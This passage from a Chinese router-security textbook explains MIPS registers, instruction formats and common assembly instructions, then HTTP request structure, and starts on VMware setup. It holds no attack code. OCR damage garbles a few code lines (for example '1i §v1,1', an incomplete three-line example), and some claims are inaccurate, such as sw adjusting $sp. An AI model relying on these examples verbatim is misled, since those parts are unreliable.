word-wrap: break-word;'>$s0~$s7</td><td style='text-align: center; word-wrap: break-word;'>saved values，子函数使用时需要先保存原寄存器的值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>24~25</td><td style='text-align: center; word-wrap: break-word;'>$t8~$t9</td><td style='text-align: center; word-wrap: break-word;'>temporaries，供汇编程序使用的临时寄存器，补充 $t0~$t7</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>26~27</td><td style='text-align: center; word-wrap: break-word;'>$k0~$k1</td><td style='text-align: center; word-wrap: break-word;'>保留，中断处理函数使用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>28</td><td style='text-align: center; word-wrap: break-word;'>$gp</td><td style='text-align: center; word-wrap: break-word;'>global pointer，全局指针</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>29</td><td style='text-align: center; word-wrap: break-word;'>$sp</td><td style='text-align: center; word-wrap: break-word;'>stack pointer，堆栈指针，指向堆栈的栈顶</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>30</td><td style='text-align: center; word-wrap: break-word;'>$fp</td><td style='text-align: center; word-wrap: break-word;'>frame pointer，保存栈指针</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>31</td><td style='text-align: center; word-wrap: break-word;'>$ra</td><td style='text-align: center; word-wrap: break-word;'>return address，返回地址</td></tr></table>

$0: 即 $zero，该寄存器总是返回 0，为 0 这个有用常数提供了一个简洁的编码形式。

在 MIPS 处理器的通用寄存器中，没有任何帮助运算判断的标志寄存器，要实现相应的功能时，都是通过测试两个寄存器是否相等完成的。MIPS 编译器常常会使用 slt、beq、bne 等指令和由寄存器 $0 获得的 0 值产生所有的比较条件，如相等、不等、小于等于、大于、大于等于。还可以用 add 指令创建 move 伪指令，如 “move $t0, $t1; $t0 = $t1” 实际为 “add $t0, $0, $t1; $t0 = $t1 + 0”。使用 MIPS 伪指令可以简化任务。汇编程序提供了比硬件更丰富的指令集。

$1 ($at) : 该寄存器为汇编保留，用做汇编器的暂时变量。

$2～$3（$v0～$v1）：用于存放子程序的返回值或非浮点结果。当这两个寄存器不够存放返回值时，编译器通过内存来完成。

$4~$7（$a0~$a3）：用于将前 4 个参数传递给子程序，不够的用堆栈处理。$a0~$a3、$v0~$v1 和 $ra 一起完成子程序函数调用过程，分别用以传递参数、返回结果和存放返回地址。当需要使用更多的寄存器时就需要堆栈了。MIPS 编译器总是为参数在堆栈中留有空间，以防有参数需要存储。

$8~$15（$t0~$t7）：依照约定，一个子函数可以不用保存并随意使用这些寄存器。在进行表达式计算时，这些寄存器是非常好的临时变量。在使用时需要注意，当调用一个子函数时，这些寄存器中的值有可能被子函数破坏。

$16~$23（$s0~$s7）：依照约定，子函数必须保证当函数返回时这些寄存器的内容

将恢复到函数调用以前的值，或者在子函数里不使用这些寄存器或把它们保存在堆栈上并在函数退出时恢复。这种约定使这些寄存器非常适合作为寄存器变量，或者用于存放一些在函数调用期间必须保存的原值。

$24~$25 ($t8~$t9)：同 $t0~$t7，作为 $t0~$t7 寄存器的补充。

$26~$27 ($k0~$k1)：通常被中断或异常处理程序使用，以保存一些系统参数。

$28 ($gp): C 语言中有两种存储类型，分别是自动型和静态型。自动变量是一个函数中的局部变量。静态变量在进入和退出一个函数时都是存在的。为了简化静态数据的访问，MIPS 保留了一个寄存器作为全局指针 gp（Global Pointer，$gp）。在编译时，数据需要在以 gp 为基指针的 64KB 范围内。

$29 ($sp) : MIPS 硬件并不直接支持堆栈, x86 有单独的 PUSH 和 POP 指令, 而 MIPS 没有单独的栈操作指令, 所有对栈的操作都是统一的内存访问方式, 但这并不影响 MIPS 使用堆栈。在发生函数调用时, 调用者把函数调用之后要用的寄存器压入堆栈, 被调用者把返回地址寄存器 $ra（并非任何时候都保存 $ra）和保留寄存器压入堆栈。同时, 调整堆栈指针, 并在返回时从堆栈中恢复寄存器。

$30 ($fp)：不同的编译器可能对该寄存器的使用方法不同。GNU MIPS C 编译器使用了栈指针（Frame Pointer）。SGI 的 C 编译器则没有使用栈指针，只是把这个寄存器当成保存寄存器使用（$s8），这虽然节省了调用和返回开销，但增加了代码生成的复杂性。

$31 ($ra)：存放返回地址。MIPS 有一个 jal（jump-and-link，跳转并链接）指令，在跳转到某个地址时可把下一条指令的地址放到 $ra 中，用于支持子程序。例如，调用程序把参数放到 $a0~$a3 中，“jal X”指令跳到 X 过程，被调过程完成后，把结果放到 $v0~$v1 中，最后使用 “jr $ra” 指令返回。在调用时需要保存的寄存器为 $a0~$a3、$s0~$s7、$gp、$sp、$fp、$ra。

# 2. 特殊寄存器

MIPS32 架构中定义了 3 个特殊的寄存器，分别是 PC（程序计数器）、HI（乘除结果高位寄存器）和 LO（乘除结果低位寄存器）。在进行乘法运算时，HI 和 LO 保存乘法的运算结果，其中 HI 存储高 32 位，LO 存储低 32 位；而在进行除法运算时，HI 保存余数，LO 存储商。

#### 1.3.2 字节序

数据在存储器中是按照字节存放的，处理器也是按照字节访问存储器中的指令或数据

的，但是如果需要读出一个字，也就是 4 字节，如 mem[n]、mem[n+1]、mem[n+2]、mem[n+3] 这 4 字节，那么最终交给处理器的有两种结果，具体如下。

{ mem[n], mem[n+1], mem[n+2], mem[n+3] }
{ mem[n+3], mem[n+2], mem[n+1], mem[n] }

前者称为大端模式（Big-Endian），也称 MSB（Most Significant Byte）；后者称为小端模式（Little-Endian），也称 LSB（Least Significant Byte）。

使用 Ubuntu 的 file 命令查看在 1.2 节中编译的大端格式 MIPS 程序 hello，如图 1-24 所示。

 </div>

在大端模式下，数据的高位保存在存储器的低地址中，而数据的低位保存在存储器的高地址中。0x12345678 在两种模式下的存储情况如图 1-25 所示。

 </div>

#### 1.3.3 MIPS寻址方式

MIPS32 架构的寻址模式有寄存器寻址、立即数寻址、寄存器相对寻址和 PC 相对寻址 4 种，其中寄存器相对寻址、PC 相对寻址的介绍如下。

➢ 寄存器相对寻址：这种寻址模式主要被加载/存储指令使用，其对一个 16 位的立即数进行符号扩展，然后与指定通用寄存器的值相加，从而得到有效地址，如图 1-26 所示。

PC 相对寻址：这种寻址模式主要被转移指令使用。在转移指令中有一个 16 位的立即数，将其左移 2 位并进行符号扩展，然后与程序计数寄存器 PC 的值相加，可得到有效地址，如图 1-27 所示。

 </div>

 </div>

#### 1.3.4 MIPS指令集

下面我们详细了解一下 MIPS 指令集。

# 1. MIPS指令的特点

MIPS 指令的特点如下。

MIPS 固定 4 字节指令长度。

内存中的数据访问（load/store）必须严格对齐（至少 4 字节对齐）。

跳转指令只有 26 位目标地址，加上 2 位对齐位，可寻址 28 位的空间，即 256MB。

条件分支指令只有 16 位跳转地址，加上 2 位对齐位，共 18 位寻址空间，即 256KB。

MIPS 默认不把子函数的返回地址（就是调用函数的受害指令地址）存放到栈中，而是存放到 $31（$ra）寄存器中，这对那些叶子函数（在函数中不再调用其他函数的函数）有利。如果遇到嵌套函数，有其他机制来处理，在第 6 章中会详细讨论。

流水线效应。MIPS 采用了高度的流水线，其中一个最重要的效应就是分支延迟效应。在分支跳转语句后面的那条语句叫做分支延迟槽。实际上，在程序执行到分支语句时，当它刚把要跳转到的地址填充好（填充到代码计数器里），还没有完成本条指令时，分支语句后面的那个指令就已经执行了，其原因就是流水线效应——几条指令同时执行，只是处于不同的阶段。

特别介绍一下流水线效应，示例如下。

1 mov $a0,$s2
2 jalr strrchr
3 move $a0,$s0

在执行第 2 行跳转分支时，第 3 行的 move 指令已经执行完了。因此，在上面的指令序列中，strchr 函数的参数来自第 3 行的 $s0，而不是第 1 行的 $s2。

从流水线效应中可以看出，是否正确理解 MIPS 指令的这些特点会直接影响我们对 MIPS 程序逆向分析的结果，因此，我们需要熟练把握这些特点。下面我们就正式开始学习 MIPS 指令的格式及常用的一些汇编指令。

# 2. 指令格式

我们已经知道，所有 MIPS 指令的长度相同，都是 32 位。为了让指令的格式刚好合适，设计者做了折中：将所有指令定长，但是不同的指令有不同的格式。在 MIPS 架构中，指令的最高 6 位均为 6 位的 Opcode 码，剩下的 24 位可以将指令分为 3 种类型，分别是 R 型、I 型和 J 型。

R 型指令用连续 3 个 5 位二进制码表示 3 个寄存器的地址，然后用 1 个 5 位二进制码表示移位的位数（如果未使用移位操作，则全为 0），最后是 6 位的 Function 码（它与 Opcode 码共同决定 R 型指令的具体操作方式）。

I 型指令则用连续 2 个 5 位二进制码表示 2 个寄存器的地址，然后是由 1 个 16 位二进制码表示的 1 个立即数二进制码。

J 型指令用 26 位二进制码表示跳转目标的指令地址（实际的指令地址应为 32 位，其中最低 2 位为 “00”，最高 4 位由 PC 当前地址决定）。

以上 3 种类型的指令对比如表 1-20 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>类型</td><td colspan="6">格式（位）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R</td><td style='text-align: center; word-wrap: break-word;'>Opcode(6)</td><td style='text-align: center; word-wrap: break-word;'>Rs(5)</td><td style='text-align: center; word-wrap: break-word;'>Rt(5)</td><td style='text-align: center; word-wrap: break-word;'>Rd(5)</td><td style='text-align: center; word-wrap: break-word;'>Shamt(5)</td><td style='text-align: center; word-wrap: break-word;'>Funct(6)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>I</td><td style='text-align: center; word-wrap: break-word;'>Opcode(6)</td><td style='text-align: center; word-wrap: break-word;'>Rs(5)</td><td style='text-align: center; word-wrap: break-word;'>Rt(5)</td><td colspan="3">Immediate(16)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>J</td><td style='text-align: center; word-wrap: break-word;'>Opcode(6)</td><td colspan="5">Address(26)</td></tr></table>

各字段含义如下。

Opcode: 指令基本操作，称为操作码。

➢Rs: 第一个源操作数寄存器。

Rt: 第二个源操作数寄存器。

➢ Rd: 存放操作结果的目的操作数。

Shamt: 位移量。

Funct: 函数，这个字段选择 Opcode 操作的某个特定变体。

# 3. 汇编常用指令

在下面对汇编指令语法的表述中，寄存器前面都使用“$”符号进行标注（如 $Rd 表示目的寄存器，$Rs 表示源寄存器，$Rt 表示作为中间缓存的寄存器），“imm”表示立即数，“MEM[]”表示 RAM 中的一段内存，“offset”表示偏移量。

##### (1) LOAD/STORE指令

LOAD/STORE 指令有 14 条，分别是 lb、lbu、lh、lhu、ll、lw、lwl、lwr、sb、sc、sh、sw、swl 和 swr，以 “1” 开头的都是加载指令，以 “s” 开头的都是存储指令，这些指令用于从存储器中读取数据，或者将数据保存在存储器中。

LA（Load Address）指令用于将一个地址或标签存入一个寄存器，如表 1-21 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>la $Rd, Label</td><td style='text-align: center; word-wrap: break-word;'>la $t0, val_1</td><td style='text-align: center; word-wrap: break-word;'>复制val_1表示的地址到 St0寄存器中，其中val_1是一个Label</td></tr></table>

☑ LI（Load Immediate）指令用于将一个立即数存入一个通用寄存器，如表 1-22 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>li $Rd, imm</td><td style='text-align: center; word-wrap: break-word;'>li $tl, 40</td><td style='text-align: center; word-wrap: break-word;'>让寄存器 $tl 赋值为 40，相当于 “addi $tl, $zero, 40;”</td></tr></table>

LW（Load Word）指令用于从一个指定的地址加载一个 word 类型的值到一个寄存器中，如表 1-23 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lw $Rt, offset($Rs)</td><td style='text-align: center; word-wrap: break-word;'>lw $s0, 0($sp)</td><td style='text-align: center; word-wrap: break-word;'>“$s0 = MEM[$sp+0];”，相当于取堆栈地址偏移0内存word长度的值到$s0中</td></tr></table>

SW（Store Word）用于将源寄存器中的值存入指定的地址，如表 1-24 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sw $Rt, offset($Rs)</td><td style='text-align: center; word-wrap: break-word;'>sw $a0, 0($sp)</td><td style='text-align: center; word-wrap: break-word;'>“MEM[$sp+0] = $a0;”，相当于将 $a0寄存器中一个word大小的值存入堆栈，且 $sp自动抬栈</td></tr></table>

MOVE 指令用于寄存器之间值的传递，如表 1-25 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>move $Rt, $Rs</td><td style='text-align: center; word-wrap: break-word;'>move $t5, $t1</td><td style='text-align: center; word-wrap: break-word;'>$t5 = $t1;</td></tr></table>

##### (2) 算术运算指令

MIPS 汇编指令的算术运算特点如下。

算数运算指令的所有操作数都是寄存器，不能直接使用 RAM 地址或间接寻址。

操作数的大小都为 word（4 Byte）。

算术运算指令有 21 条，分别是 add、addi、addiu、addu、sub、subu、clo、clz、slt、slti、sltiu、sltu、mul、mult、multu、madd、maddu、msub、msubu、div 和 divu，实现了加、减、比较、乘、乘累加、除等运算，如表 1-26 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>指令格式与实例</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>add $t0, $t1, $t2</td><td style='text-align: center; word-wrap: break-word;'>“$t0 = $t1 + $t2;”，带符号数相加</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sub $t0, $t1, $t2</td><td style='text-align: center; word-wrap: break-word;'>“$t0 = $t1 - $t2;”，带符号数相减</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>addi $t0, $t1, 5</td><td style='text-align: center; word-wrap: break-word;'>$t0 = $t1 + 5;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>addu $t0, $t1, $t2</td><td style='text-align: center; word-wrap: break-word;'>“$t0 = $t1 + $t2;”，无符号数相加</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>subu $t0, $t1, $t2</td><td style='text-align: center; word-wrap: break-word;'>“$t0 = $t1 - $t2;”，无符号数相减</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mult $t3, $t4</td><td style='text-align: center; word-wrap: break-word;'>“$t3 * $t4”，把64 Bits的积存储到“Lo, Hi”中，即“(Hi, Lo) = $t3 * $t4;”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>div $t5, $t6</td><td style='text-align: center; word-wrap: break-word;'>“SLO = $t5 / $t6”，SLO为商的整数部分；“$HI = $t5 mod $t6”，$HI为余数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mfhi $t0</td><td style='text-align: center; word-wrap: break-word;'>$t0 = $HI</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mflo $t1</td><td style='text-align: center; word-wrap: break-word;'>$t1 = $LO</td></tr></table>

##### (3) 类比较指令

在 MIPS 寄存器中没有标志寄存器，但是在 MIPS 指令中有一种指令——SLT 系列指令，可以通过比较设置某个寄存器后与分支跳转指令联合使用。这种用法类似 x86 的比较指令。

SLT（Set on Less Than）指令在 $Rs 小于（有符号比较）$Rt 时设置寄存器 $Rd 为 1，否则设置 $Rd 为 0，如表 1-27 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>slt $Rd,$Rs,$Rt</td><td style='text-align: center; word-wrap: break-word;'>slt $v0, $a0, $s0</td><td style='text-align: center; word-wrap: break-word;'>如果 $a0 小于（有符号比较）$s0，设置 $v0 为 1，否则为 0</td></tr></table>

SLTI（Set on Less Than Immediate）指令在 $Rs 小于（有符号比较）立即数 imm 时设置寄存器 $Rt 为 1，否则设置 $Rt 为 0，如表 1-28 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>slti $Rt,$Rs, inm</td><td style='text-align: center; word-wrap: break-word;'>slti $v0, $a0, 255</td><td style='text-align: center; word-wrap: break-word;'>如果 $a0 小于（有符号比较）255，设置 $v0 为 1，否则为 0</td></tr></table>

SLTU（Set on Less Than Unsigned）指令在 $Rs 小于（无符号比较）$Rt 时设置寄存器 $Rd 为 1，否则设置 $Rd 为 0，如表 1-29 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sltu $Rd,$Rs,$Rt</td><td style='text-align: center; word-wrap: break-word;'>sltu $v0, $a0, $s0</td><td style='text-align: center; word-wrap: break-word;'>如果 $a0 小于（无符号比较）$s0，设置 $v0 为 1，否则为 0</td></tr></table>

SLTIU（Set on Less Than Immediate Unsigned）指令在 $Rt 小于（无符号比较）imm 时设置寄存器 $Rt 为 1，否则设置 $Rt 为 0，如表 1-30 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sltiu $Rt,$Rs, imm</td><td style='text-align: center; word-wrap: break-word;'>sltiu $v0, $a0, 255</td><td style='text-align: center; word-wrap: break-word;'>如果 $a0 小于（无符号比较）255，设置 $v0 为 1，否则为 0</td></tr></table>

类比较指令用法示例如下。

1i §v1,1

beq $v0,$v1,loc_41A394

这 3 行代码实现的功能相当于伪代码 “if($s2 < 2) goto loc_41A394”。

##### (4) SYCALL (SYSTEM CALL)

SYSCALL 可以产生一个软中断，从而实现系统调用，如表 1-31 所示。系统调用号存放在 $v0 中，参数存放在 $a0~$a3 中。如果参数过多，会有另一套机制来处理。系统调用的返回值通常放在 $v0 中。如果系统调用出错，则会在 $a3 中返回一个错误号。在编写 MIPS 汇编语言的 Shellcode 时，需要使用该指令，在第 7 章中会详细介绍。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语法</td><td style='text-align: center; word-wrap: break-word;'>实例</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>addiu $sp, $sp, -32li $a0,1lui $t6, 0x4142ori $t6, $t6, 0x430a“Write(1,&quot;ABC\n&quot;,5);”，调用系统调用号为4004（write）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>syscall</td><td style='text-align: center; word-wrap: break-word;'>sw $t6, 0($sp)addiu $a1, $sp, 0li $a2, 5li $v0, 4004syscall</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

##### (5) 分支跳转指令

在 MIPS 中，分支跳转指令本身可以通过比较两个寄存器中的值来决定是否跳转，如表 1-32 所示。要想实现与立即数比较的跳转，可以结合类跳转指令实现。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>分支指令格式与实例</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>b target</td><td style='text-align: center; word-wrap: break-word;'>无条件的分支跳转，将跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>beq $t0, $t1, target</td><td style='text-align: center; word-wrap: break-word;'>如果“$t0 = $t1”，则跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>blt $t0, $t1, target</td><td style='text-align: center; word-wrap: break-word;'>如果“$t0 &lt; $t1”，则跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ble $t0, $t1, target</td><td style='text-align: center; word-wrap: break-word;'>如果“$t0 &lt;= $t1”，则跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>bgt $t0, $t1, target</td><td style='text-align: center; word-wrap: break-word;'>如果“$t0 &gt; $t1”，则跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>bge $t0, $t1, target</td><td style='text-align: center; word-wrap: break-word;'>如果“$t0 &gt;= $t1”，则跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>bne $t0, $t1, target</td><td style='text-align: center; word-wrap: break-word;'>如果“$t0 != $t1”，则跳转到target标签处</td></tr></table>

##### (6) 跳转指令

常用的跳转指令如表 1-33 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>指令格式与实例</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>j target</td><td style='text-align: center; word-wrap: break-word;'>无条件跳转，将跳转到target标签处</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jr $t3</td><td style='text-align: center; word-wrap: break-word;'>跳转到$t3寄存器指向的地址处（Jump Register）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>jal target</td><td style='text-align: center; word-wrap: break-word;'>跳转到target标签处，并保存返回地址到$ra中</td></tr></table>

在跳转指令中，需要对子函数调用指令进行特别说明，其函数调用和返回过程如下。

子函数的调用：jal sub_routine_label

01 复制当前的 PC 值到 $ra 寄存器中（当前的 PC 值就是子函数执行完毕后的返回地址）。

02 程序跳转到子程序标签 sub_routine_label 处。

子函数的返回：jr $ra

如果子函数内又调用了其他子函数，那么 $ra 的值应该被保存到堆栈中（因为 $ra 的值总是对应着当前执行的子函数的返回地址）。

以上介绍的 MIPS 汇编语言基础知识已经能够满足路由器安全研究的基本需要了。如果读者想了解其他高级指令，可以通过相关资料和书籍进行深入学习。

## 1.4 HTTP协议

家用路由器中的 Web 服务器常有漏洞存在，而与 Web 服务器通信时 HTTP 协议是必不可少的。但是，路由器的很多漏洞都存在于 Web 服务器没有正确解析攻击者发送的 HTTP 请求协议上，因此，了解 HTTP 协议的相关基础知识对这种类型的漏洞分析和漏洞挖掘都是非常有必要的。

HTTP 请求由 3 部分组成，分别是请求行、消息报头和请求正文。

#### 1.4.1 HTTP协议请求行

请求行以一个方法符号开头，以空格分开，后面跟着请求的 URI 和协议的版本，格式如下。

“Method”表示请求方法；“Request-URI”是一个统一资源标识符；“HTTP-Version”表示请求的 HTTP 协议版本；“CRLF”表示回车和换行（除了作为结尾的“CRLF”外，不允许出现单独的“CR”或“LF”字符），在 C 语言中表达为“\r\n”，而作为十六进制数则为“\x0D\x0A”。

请求方法有很多种，所有方法名全为大写，服务器不一定需要实现所有的请求方法。各方法的解释如下。

GET: 请求获取 Request-URI 所标识的资源。

POST: 在 Request-URI 所标识的资源后附加新的数据。

HEAD：请求获取由 Request-URI 所标识的资源的响应消息报头。

PUT：请求服务器存储一个资源，并用 Request-URI 作为其标识。

DELETE：请求服务器删除 Request-URI 所标识的资源。

➢ TRACE：请求服务器回送收到的请求信息，主要用于测试或诊断。

CONNECT：保留将来使用。

OPTIONS：请求查询服务器的性能，或者查询与资源相关的选项和需求。

这里具体介绍 GET 方法和 POST 方法，因为它们在路由器安全研究中的使用最为频繁。

# 1. GET方法

GET 方法是默认的 HTTP 请求方法，通常情况下使用 GET 方法提交表单数据。用 GET 方法提交的表单数据只经过了简单的编码，同时作为 URL 的一部分向 Web 服务器发送，因此，使用 GET 方法提交表单数据就存在着安全隐患。

例如，在“http://baike.baidu.com/subview/370184/5079661.htm?fr=aladdin”这个 URL 请求中，我们很容易就可以辨认表单提交的内容（“?”之后的内容）。另外，由于 GET 方法提交的数据是作为 URL 请求的一部分出现的，所以不能用于提交大量数据。

# 2. POST方法

POST 方法是 GET 方法的一个替代方法，主要用于向 Web 服务器提交表单数据，尤其是大量的数据。POST 方法克服了 GET 方法的一些缺点。通过 POST 方法提交表单数据时，数据不是作为 URL 请求的一部分，而是作为标准数据传送给 Web 服务器，这就克服了 GET 方法中信息无法保密和提交数据量太小的缺点。因此，出于对安全的考虑和对用户隐私的尊重，提交表单时通常采用 POST 方法。

在本章中我们学习的路由器漏洞及 MIPS Linux 系统的相关知识是路由器漏洞研究的基础。熟练掌握这些知识，能使我们在学习高级的技术知识时更加游刃有余。

# 3. 应用举例

在浏览器的地址栏中以输入网址的方式访问网页时，浏览器采用 GET 方法向服务器获取资源，示例如下。

GET /form.html HTTP/1.1 (CRLF)

POST 方法要求被请求服务器接受附在请求后面的数据，常用于提交表单，示例如下。

POST /register.aspx HTTP/ (CRLF)
Accept: image/gif, image/x-xbitmap, */* (CRLF)
HOST: www.baidu.com (CRLF)
Content-Length: 22 (CRLF)
Connection: Keep-Alive (CRLF)
(CRLF) //该CRLF表示消息报头已经结束，在此之前为消息报头
user=admin&pwd=1234 //此行以下为提交的数据

HEAD 方法与 GET 方法几乎是一样的，对于 HEAD 请求的回应部分来说，它的 HTTP 头部中包含的信息与通过 GET 请求得到的信息相同。利用这个方法，不必传输整个资源内容，就可以得到 Request-URI 所标识的资源的信息。该方法常用于测试超链接的有效性、是否可以访问及最近是否更新。

#### 1.4.2 HTTP协议消息报头

HTTP 消息由客户端到服务器的请求和服务器到客户端的响应组成。HTTP 的消息包括请求消息和响应消息，作为模糊测试数据构造。我们仅关心请求消息，因此这里简单介绍请求消息的报头。

请求报头允许客户端向服务器端传递请求的附加信息及客户端自身的信息。请求报头域的定义如下。

 $$  名字 +:+ 空格 + 值 $$ 

消息报头域的名字是大小写无关的。

常用的请求报头介绍如下。

##### (1) Accept

Accept 请求报头域用于指定客户端接受哪些类型的信息。

“Accept:text/html”表明客户端希望接受 HTML 文本。

##### (2) Accept-Encoding

Accept-Encoding 请求报头域类似于 Accept 请求报头，用于指定可接受的内容编码，示例如下。

Accept-Encoding: gzip.deflate

如果请求消息中没有设置这个域，则服务器假定客户端可以接受各种语言的编码。

##### (3) Cookie

Cookie 请求头用于客户端向服务器提交 Cookie 信息验证，示例如下。

Cookie: YWRtaW46YWRtaW4=

##### (4) Accept-Language

Accept-Language 请求报头域类似于 Accept 请求报头，用于指定一种自然语言，示例如下。

Accept-Language:zh-cn

##### (5) Authorization

如果请求消息中没有设置这个报头域，则服务器假定客户端可以接受各种语言的编码。

Authorization 请求报头域主要用于证明客户端有权查看某个资源。当浏览器访问一个页面时，如果收到服务器的响应代码为 401（未授权），可以发送一个包含 Authorization 请求报头域的请求，要求服务器对其进行验证。

##### (6) Host

Host 请求报头域主要用于指定被请求资源的 Internet 主机和端口号，它通常从 HTTP URL 中提取出来。发送请求时，该报头域是必需的。

在浏览器地址栏中输入“http://www.baidu.com/index.html”，在浏览器发送的请求消息中就会包含 Host 请求报头域，示例如下。

Host: www.baidu.com

此处使用默认端口号 80。若指定了端口号，则以上源码变成如下形式。

##### (7) User-Agent

上网登录论坛的时候，往往会看到一些欢迎信息，其中列出了访问者使用的操作系统的名称和版本，这往往让很多人感到很神奇。实际上，服务器应用程序就是从 User-Agent 这个请求报头域中获取这些信息的。

User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。不过，这个报头域不是必需的。如果我们自己编写一个浏览器，不使用 User-Agent 请求报头域，那么服务器端就无法得知我们的信息了。

请求报头示例如下。

GET /index.html HTTP/1.1 (CRLF)
Accept: image/gif, image/x-xbitmap, */* (CRLF)
Accept-Language: zh-cn (CRLF)
Accept-Encoding: gzip, deflate (CRLF)
User-Agent: Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.0) (CRLF)
Host: www.baidu.com (CRLF)
Connection: Keep-Alive (CRLF)
(CRLF)

#### 1.4.3 HTTP协议请求正文

请求头和请求正文之间是一个空行。这个行非常重要，它表示请求头已经结束，接下来的内容是请求正文。在请求正文中可以包含客户提交的查询字符串信息，示例如下。

username=admin&password=admin

在以上 HTTP 请求中，请求的正文只有一行内容。当然，在实际应用中，HTTP 请求的正文可以包含更多的内容。

### 第 2 章 必备软件和环境

路由器漏洞的分析，不可能仅凭借头脑完成。在这个过程中，我们需要借助必要的工具实现对漏洞的分析和利用。本章将介绍路由器漏洞分析过程中必不可少的软件，以及路由器分析环境的安装、配置和使用方法。

## 2.1 路由器漏洞分析必备软件

本节将介绍路由器漏洞分析过程中必不可少的软件。

#### 2.1.1 VMware的安装和使用

VMware 虚拟机是可以在一台机器上运行 2 个或者更多 Windows、DOS、Linux 系统的虚拟软件。在虚拟机中运行的每个操作系统都可以进行虚拟的分区、配置而不影响真实硬盘中的数据，甚至可以通过网卡将几台虚拟机连接成一个局域网，使用极其方便。因此，它非常适合学习和测试。在路由器的安全研究中，我们通常使用虚拟机建立分析系统。

# 1. 安装VMware

我们先安装 VMware 虚拟机程序。这里使用的是 VMware Workstation 8.0，其之前和之后的版本在使用上大同小异。

